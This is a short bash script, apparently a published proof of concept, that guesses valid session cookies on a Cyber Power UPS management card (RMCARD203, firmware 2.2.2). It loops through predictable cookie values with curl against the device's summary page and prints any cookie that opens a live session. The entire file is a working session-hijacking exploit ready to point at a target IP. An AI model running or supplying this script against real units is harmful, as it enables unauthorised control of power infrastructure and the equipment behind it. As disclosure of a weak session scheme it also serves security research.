# Author: Scott Willett
# Version: 14/11/2018 10:24 AM
#
# Description:
# Guesses the cookie of a valid session logged into a Cyber Power UPS.
# Only tested on model RMCARD203 with hardware version 2.0 and firmware version 2.2.2

# Input the IP address of your unit here:
ip="172.16.1.17"

# Numbers used in the middle of the cookie string
middle_numbers="0842"

# Used to display how many tries it took to find a valid session
try=1

# Infinite loop
while true;
do
	# Loop through the higher value numbers
	for high_number in {183..243};
	do
		# Loop through the lower value numbers
		for low_number in {483..893};
		do
			# The cookie to test
			cookie="${high_number}${middle_numbers}${low_number}"

			# Test the cookie
			output=`curl -s "http://${ip}/summary.html" --cookie "cocp=$cookie"`

			# If a response is returned, there's a valid session using this cookie
			if [[ ! -z $output ]]; then

				# Display the results to the user
				echo "Cookie is: ${cookie}"
				echo "Cookie found on attempt: ${try}"

			fi

			# Increment the try count
			try="$(($try+1))"

		done
	done
done
